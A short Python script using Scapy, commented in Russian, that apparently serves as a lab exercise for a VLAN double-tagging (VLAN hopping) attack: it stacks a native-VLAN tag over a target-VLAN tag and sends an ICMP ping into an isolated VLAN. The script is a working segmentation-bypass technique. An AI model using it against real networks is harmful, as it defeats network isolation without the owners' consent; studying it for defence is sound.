#!/usr/bin/env python3
from scapy.all import *

def main():
    # MAC-адрес атакующего и целевой IP в изолированном VLAN 20
    attacker_mac = get_if_hwaddr(conf.iface)
    target_ip = "10.0.20.50"
    
    # 1. Задаем номера VLAN
    native_vlan = 1 # Укажи номер Native VLAN (по умолчанию у Cisco)
    target_vlan = 20 # Укажи номер целевого изолированного VLAN
    
    # 2. Собираем матрешку (Double Tagging)
    # Вставь правильные переменные в классы Dot1Q
    packet = (
        Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / 
        Dot1Q(vlan=1) / 
        Dot1Q(vlan=20) / 
        IP(dst=target_ip) / 
        ICMP() # Для теста используем ICMP Echo Request (Ping)
    )

    print(f"[*] Отправка Double Tagged пакета: Native VLAN {native_vlan} -> Target VLAN {target_vlan}")
    
    # 3. Отправляем на канальном уровне
    sendp(packet, verbose=False)
    print("[+] Пакет успешно инжектирован в изолированную сеть!")

if __name__ == "__main__":
    main()